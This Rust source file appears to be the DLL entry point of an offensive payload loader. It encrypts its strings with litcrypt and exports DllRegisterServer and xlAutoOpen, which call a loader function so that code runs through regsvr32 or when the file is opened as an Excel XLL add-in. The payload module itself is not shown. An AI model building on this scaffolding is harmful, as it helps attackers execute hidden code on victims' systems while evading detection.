pub const DLL_PROCESS_ATTACH: u32 = 1u32;
pub const DLL_PROCESS_DETACH: u32 = 0u32;

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

#[repr(transparent)]
pub struct HINSTANCE(pub isize);

mod loader;
mod helpers;
mod winapi;
mod error;
mod debug;

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: u32,
    _: *mut ())
    -> bool
{
    match call_reason {
        DLL_PROCESS_ATTACH => (),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }

    true
}


#[cfg(feature = "regsvr")]
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllRegisterServer()  {
    loader::do_load();
}
                             
#[cfg(feature = "xll")]
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn xlAutoOpen()  {
    loader::do_load();
}